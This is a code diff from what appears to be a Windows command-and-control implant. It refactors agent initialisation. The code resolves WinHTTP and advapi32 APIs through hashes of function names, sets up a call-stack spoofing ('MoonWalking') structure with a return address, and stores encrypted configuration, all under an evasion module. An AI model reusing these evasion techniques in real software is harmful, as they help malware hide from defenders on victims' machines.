@@ -4,8 +4,10 @@
 #include "../../headers/cstdreplacement/localcstd.h"
 #include "../../headers/helpers/parser.h"
 #include "../../headers/helpers/ListManager.h"
-#include "../../headers/agent/evasion/PeParsing/evasive.h"
+#include "../../headers/agent/evasion/Common.h"
 
+
+//TODO parse bytes from custom section.
 #ifdef CONFIG_BYTES
 BYTE AgentConfigBytes[] = CONFIG_BYTES;
 #endif
@@ -29,7 +31,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 UINT64 DllHashes[2] = { 0 };
 UINT64 ApiHashes[50] = { 0 };
 
-INT init_agent() {
+INT init_agent(PVOID RetAddress) {
 
 
 #ifdef _WIN64
@@ -43,7 +45,6 @@ INT init_agent() {
     if (!ParseHashConfig()) {
         return -1;
     }
-
 
     //obtain winhttp apis
     //NEEDS TO be resolved using a hash of the function name.
@@ -193,7 +194,6 @@ INT init_agent() {
         return -1;
     }
 
-
     //obtain advapi32 apis
     agent->apis->pGetUserNameA = (t_GetUserNameA)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[20]);
     if (!agent->apis->pGetUserNameA) {
@@ -249,23 +249,31 @@ INT init_agent() {
         return -1;
     }
 
-	agent->session = (pHttpSession)agent->apis->pLocalAlloc(LPTR, sizeof(HttpSession));
-	if (!agent->session) {
-		printf("[error] attempting to allocate memory for session\n");
-		return -1;
-	}
+    agent->session = (pHttpSession)agent->apis->pLocalAlloc(LPTR, sizeof(HttpSession));
+    if (!agent->session) {
+        printf("[error] attempting to allocate memory for session\n");
+        return -1;
+    }
 
     agent->Walker = (pMoonWalking)agent->apis->pLocalAlloc(LPTR, sizeof(MoonWalking));
     if(!agent->Walker) {
         printf("[error] attempting to allocate memory for walker\n");
         return -1;
     }
+
     agent->Walker->Arguments = (PArgs)agent->apis->pLocalAlloc(LPTR, sizeof(Args));
     if(!agent->Walker->Arguments) {
         printf("[error] attempting to allocate memory for walker arguments\n");
         return -1;
     }
 
+    agent->PEInfo = (pPEINFO)agent->apis->pLocalAlloc(LPTR, sizeof(PEINFO));
+    if(!agent->PEInfo) {
+        printf("[error] attempting to allocate memory for peinfo\n");
+        return -1;
+    }
+
+    agent->Walker->RetAddr = RetAddress;
 
 #if _WIN64
     agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
@@ -327,9 +335,9 @@ INT init_agent() {
     agent->EncryptedIV = EncryptedIV;
     agent->EncryptedIVSize = EncryptedIvSize;
 
-    agent->ModuleBaseAddr = GetModuleBaseAddr(0);
-    agent->ImageSize = GetImageSize(agent->ModuleBaseAddr);
-    agent->NumSections = GetNumberOfSections(agent->ModuleBaseAddr);
+    agent->PEInfo->ModuleBaseAddr = GetModuleBaseAddr(0);
+    agent->PEInfo->ImageSize = GetImageSize(agent->PEInfo->ModuleBaseAddr);
+    agent->PEInfo->NumSections = GetNumberOfSections(agent->PEInfo->ModuleBaseAddr);
 
     return 0;
 }
@@ -461,6 +469,7 @@ BOOL ParseHashConfig() {
         printf("[error] attempting to allocate memory for win32 apis\n");
         return -1;
     }
+    //obtain some necessary function pointers.
     agent->apis->pLocalAlloc = pLocalAlloc;
     agent->apis->hKernel32 = k32;
     agent->apis->hNtdll = ntdll;
